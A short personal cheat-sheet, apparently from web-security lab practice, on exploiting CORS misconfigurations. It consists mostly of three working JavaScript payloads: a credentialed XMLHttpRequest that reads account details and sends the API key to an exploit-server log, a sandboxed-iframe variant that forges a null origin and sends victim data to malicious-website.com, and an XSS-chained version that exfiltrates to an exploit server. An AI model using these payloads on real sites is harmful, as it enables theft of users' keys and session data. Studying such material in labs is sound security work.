Cross-origin resource sharing (CORS)

In case of a CORS, in this case when there is an API call retriving some data, such as api key)
You can use this exploit
Is usefull to have a look sometime into the http history

<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','$url/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText; //this will send the key to the log exploit server
        
    };
</script>

Sometimes you can trick the origin whith a null request, such as this one, with the iframe, the origin will be null

<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText; //or +encodeURIComponent(this.responseText);
};
</script>"></iframe>


Another vulnerabilities could be triggered, though XSS and other kind of ways
<script>
    document.location="http://stock.$your-lab-url/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>


